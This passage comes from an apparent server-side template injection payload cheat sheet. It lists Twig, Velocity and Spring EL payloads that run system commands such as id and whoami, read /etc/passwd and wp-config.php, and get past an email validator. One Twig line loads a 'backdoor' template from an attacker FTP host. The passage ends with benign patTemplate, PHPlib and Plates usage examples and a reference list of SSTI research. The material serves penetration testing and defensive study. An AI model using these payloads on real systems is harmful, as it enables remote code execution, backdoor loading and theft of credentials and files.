"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{include("wp-config.php")}}
```

### Twig - Code execution

```python
{{self}}
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{[0]|reduce('system','id')}}
{{['id']|map('system')|join}}
{{['id',1]|sort('system')|join}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id']|filter('passthru')}}
{{['id']|map('passthru')}}
```

Example injecting values to avoid using quotes for the filename (specify via OFFSET and LENGTH where the payload FILENAME is)

```python
FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}
```

Example with an email passing FILTER_VALIDATE_EMAIL PHP.

```powershell
POST /subscribe?0=cat+/etc/passwd HTTP/1.1
email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
```

---

## Java - Velocity

[Official website](https://velocity.apache.org/engine/1.7/user-guide.html)
> Velocity is a Java-based template engine. It permits web page designers to reference methods defined in Java code.

```python
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

---


## Java - Spring

```python
*{7*7}
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

---

## patTemplate

> [patTemplate](https://github.com/wernerwa/pat-template) non-compiling PHP templating engine, that uses XML tags to divide a document into different parts

```xml
<patTemplate:tmpl name="page">
  This is the main page.
  <patTemplate:tmpl name="foo">
    It contains another template.
  </patTemplate:tmpl>
  <patTemplate:tmpl name="hello">
    Hello {NAME}.<br/>
  </patTemplate:tmpl>
</patTemplate:tmpl>
```

---

## PHPlib and HTML_Template_PHPLIB

[HTML_Template_PHPLIB](https://github.com/pear/HTML_Template_PHPLIB) is the same as PHPlib but ported to Pear.

`authors.tpl`

```html
<html>
 <head><title>{PAGE_TITLE}</title></head>
 <body>
  <table>
   <caption>Authors</caption>
   <thead>
    <tr><th>Name</th><th>Email</th></tr>
   </thead>
   <tfoot>
    <tr><td colspan="2">{NUM_AUTHORS}</td></tr>
   </tfoot>
   <tbody>
<!-- BEGIN authorline -->
    <tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
   </tbody>
  </table>
 </body>
</html>
```

`authors.php`

```php
<?php
//we want to display this author list
$authors = array(
    'Christian Weiske'  => 'cweiske@php.net',
    'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
    $t->setVar('AUTHOR_NAME', $name);
    $t->setVar('AUTHOR_EMAIL', $email);
    $t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```

---

## Plates

Plates is inspired by Twig but a native PHP template engine instead of a compiled template engine.

controller:

```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```

page template:

```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```

layout template:

```php
<html>
  <head>
    <title><?=$this->e($title)?></title>
  </head>
  <body>
    <?=$this->section('content')?>
  </body>
</html>
```

---

## References

* [https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)
* [Ruby ERB Template injection - TrustedSec](https://www.trustedsec.com/2017/09/rubyerb-template-injection/)
* [Gist - Server-Side Template Injection - RCE For the Modern WebApp by James Kettle (PortSwigger)](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)
* [PDF - Server-Side Template Injection: RCE for the modern webapp - @albinowax](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
* [VelocityServlet Expression Language injection](https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/)
* [Cheatsheet - Flask & Jinja2 SSTI - Sep 3, 2018 • By phosphore](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
* [RCE in Hubspot with EL injection in HubL - @fyoorer](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html?spref=tw)
* [Jinja2 template injection filter bypasses - @gehaxelt, @0daywork](https://0day.work/jinja2-template-injection-filter-bypasses/)
* [Gaining Shell using Server Side Template Injection (SSTI) - David Valles - Aug 22, 2018](https://medium.com/@david.valles/gaining-shell-using-server-side-template-injection-ssti-81e29bb8e0f9)
* [EXPLOITING SERVER SIDE TEMPLATE INJECTION WITH TPLMAP - BY: DIVINE SELORM TSA - 18 AUG 2018](https://www.owasp.org/images/7/7e/Owasp_SSTI_final.pdf)
* [Server Side Template Injection – on the example of Pebble - MICHAŁ BENTKOWSKI | September 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
* [Server-Side Template Injection (SSTI) in ASP.NET Razor - Clément Notin - 15 APR 2020](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/)
* [Expression Language injection - PortSwigger](https://portswigger.net/kb/issues/00100f20_expression-language-injection)
* [Bean Stalking: Growing Java beans into RCE - July 7, 2020 - Github Security Lab](https://securitylab.github.com/research/bean-validation-RCE)
* [Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - 29/01/2019](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
* [Handlebars template injection and RCE in a Shopify app ](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
* [Lab: Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
* [Exploiting Less.js to Achieve RCE](https://www.softwaresecured.com/exploiting-less-js/)
* [A Pentester's Guide to Server Side Template Injection (SSTI)](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)
* [Django Templates Server-Side Template Injection](https://lifars.com/wp-content/uploads/2021/06/Django-Templates-Server-Side-Template-Injection-v1.0.pdf)
* [#HITB2022SIN #LAB Template Injection On Hardened Targets - Lucas 'BitK' Philippe](https://youtu.be/M0b_KA0OMFw)
* [Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass - Dec 4, 2022](https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)
* [Leveraging the Spring Expression Language (SpEL) injection vulnerability ( a.k.a The Magic SpEL) to get RCE - Xenofon Vassilakopoulos - November 18, 2021](https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/)
* [Expression Language Injection - OWASP](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
